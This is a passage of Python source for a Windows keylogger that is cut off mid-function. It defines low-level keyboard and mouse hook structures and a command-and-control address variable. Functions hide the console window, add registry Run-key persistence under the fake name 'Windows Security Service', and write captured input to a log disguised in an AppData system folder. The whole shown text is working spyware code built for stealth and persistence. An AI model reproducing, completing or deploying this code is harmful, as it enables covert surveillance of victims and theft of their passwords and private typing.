import sys
import os
import ctypes
import ctypes.wintypes
import time
import threading
import socket
import json
import requests
import uuid
import winreg
from urllib.parse import quote

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
WM_LBUTTONDOWN = 0x0201
WM_RBUTTONDOWN = 0x0204

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", ctypes.wintypes.DWORD), ("scanCode", ctypes.wintypes.DWORD), ("flags", ctypes.wintypes.DWORD), ("time", ctypes.wintypes.DWORD), ("dwExtraInfo", ctypes.wintypes.ULONG_PTR)]

class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

class MSLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("pt", POINT), ("mouseData", ctypes.wintypes.DWORD), ("flags", ctypes.wintypes.DWORD), ("time", ctypes.wintypes.DWORD), ("dwExtraInfo", ctypes.wintypes.ULONG_PTR)]

keyboard_buffer = []
stop_event = threading.Event()
log_file_path = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'SystemApps', 'log.txt')
C2_DOMAIN = "http://127.0.0.1:5000"

def get_ip():
    try:
        hostname = socket.gethostname()
        ips = socket.gethostbyname_ex(hostname)[2]
        for ip in ips:
            if not ip.startswith("127.") and "." in ip:
                return ip
    except Exception:
        pass
    return "Unknown"

def hide_console():
    kernel32.FreeConsole()
    hwnd = kernel32.GetConsoleWindow()
    if hwnd:
        user32.ShowWindow(hwnd, 0)

def create_mutex():
    mutex = kernel32.CreateMutexW(None, True, f"Global\\{uuid.uuid4().hex}")
    if kernel32.GetLastError() == 0xB7:
        kernel32.CloseHandle(mutex)
        sys.exit(0)
    return mutex

def setup_persistence():
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(__file__)
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "Windows Security Service", 0, winreg.REG_SZ, f'"{exe_path}"')
    except Exception:
        pass

def write_log(data):
    try:
        os.makedirs(os.path.dirname(log_file_path), exist_ok=True)
        with open(log_file_path, 'a', encoding='utf-8') as f:
            f.write